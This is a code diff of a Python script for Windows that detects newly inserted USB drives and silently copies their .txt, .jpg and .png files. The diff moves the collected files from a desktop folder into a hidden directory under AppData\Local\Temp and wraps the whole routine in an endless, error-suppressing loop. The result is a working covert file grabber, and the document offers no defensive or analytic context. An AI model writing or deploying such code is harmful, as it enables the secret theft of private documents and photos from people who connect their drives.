@@ -12,16 +12,25 @@ def drive_find():
             drive.append(harf)
         bitmask>>=1
     return drive
-first=drive_find()
-time.sleep(10)
-second=drive_find()
-if len(second) > len(first):
-    usb_drive= set(second)-set(first)
-    for drive in usb_drive:
-        for ky,ki,di in os.walk(drive+":/"):
-            for x in di:
-                if x.endswith(".txt") or x.endswith(".jpg") or x.endswith(".png"):
-                    shutil.copy(ky+"/"+x,"C:/Users/zeyne/OneDrive/Desktop/usb_file")
+username=os.getlogin()
+if not os.path.exists("C:/Users/"+username+"/Appdata/Local/Temp/QP"):
+    os.mkdir("C:/Users/"+username+"/Appdata/Local/Temp/QP")
+
+while True:
+    try:
+        first=drive_find()
+        time.sleep(10)
+        second=drive_find()
+        if len(second) > len(first):
+            usb_drive= set(second)-set(first)
+            for drive in usb_drive:
+                for ky,ki,di in os.walk(drive+":/"):
+                    for x in di:
+                        if x.endswith(".txt") or x.endswith(".jpg") or x.endswith(".png"):
+                            shutil.copy(ky+"/"+x,"C:/Users/"+username+"/Appdata/Local/Temp/QP")
+    except:
+        pass
+
 
 
 
